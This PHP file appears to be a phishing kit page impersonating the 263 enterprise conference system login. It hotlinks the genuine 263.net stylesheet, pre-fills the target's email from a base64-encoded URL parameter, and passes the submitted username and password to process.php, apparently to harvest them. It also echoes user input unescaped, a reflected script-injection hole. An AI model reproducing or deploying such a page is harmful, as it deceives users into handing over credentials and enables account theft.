<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{
$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>263企业会议管理系统-用户登录</title>
<link href="http://www.263.net/263/user/css/main.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="http://www.263.net/263/js/jqueryMin.js"></script>
<script type="text/javascript" src="../Email_files/login.js"></script>
</head>

<body>
<div class="login_warpper">
	<div><img src="../Email_files/logo.png" width="659" height="100"></div>
    </div>
    <div class="login_banner">
    <form  enctype="application/x-www-form-urlencoded; charset=utf-8" id="loginform" name="loginform" method="post">
    	<div class="login_warpper login_bg">
       	  <div class="login_form">
                  <input type="hidden" name="logins" value="<?php echo $log; ?>">
                
                <?php if ($_GET['hihi']=='1') { ?>
                
                <input type="hidden" name="hihihi" value="<?php echo $log; ?>">
                
                  <?php }?>
                    <?php if ($_GET['hihi']=='2') { ?>
                
                <input type="hidden" name="hihi" value="<?php echo $log; ?>">
                
                  <?php }?>
                    <?php if ($_GET['hihi']=='3') { ?>
                
                <input type="hidden" name="hihi" value="<?php echo $log; ?>">
                
                  <?php }?>
            	<input name="login"value="<?php echo $log; ?>" type="text">
            	<input name="pass" type="password">
                <a href="javascript:void(0);" class="btn_summit" onclick="login();"></a>
            </div>
        </div>
        </form>
    </div>
	<div class="login_footer">Copyright©1998-2016 北京二六三企业通信有限公司 </div>


</body></html><?php}?>